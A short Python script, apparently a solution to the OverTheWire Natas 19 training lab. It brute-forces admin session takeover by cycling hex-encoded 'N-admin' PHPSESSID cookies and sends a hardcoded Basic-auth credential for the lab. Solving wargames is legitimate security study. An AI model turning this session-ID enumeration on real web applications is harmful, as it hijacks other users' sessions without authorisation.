#! /usr/bin/python3

import string
import sys
import time
import urllib.parse
import urllib.request


def main():
    url = 'http://natas19.natas.labs.overthewire.org/'
    headers = {
        'Authorization': 'Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg=='
    }

    for i in range(640):
        print(f'Trying PHPSESSSID {i + 1}')

        headers['Cookie'] = f'PHPSESSID={(str(i + 1) + "-admin").encode().hex()}'
        req = urllib.request.Request(url, headers=headers)
        resp = urllib.request.urlopen(req)

        resp_body = resp.read().decode()
        if not "You are logged in as a regular user." in resp_body:
            print(resp_body)


if __name__ == "__main__":
    main()
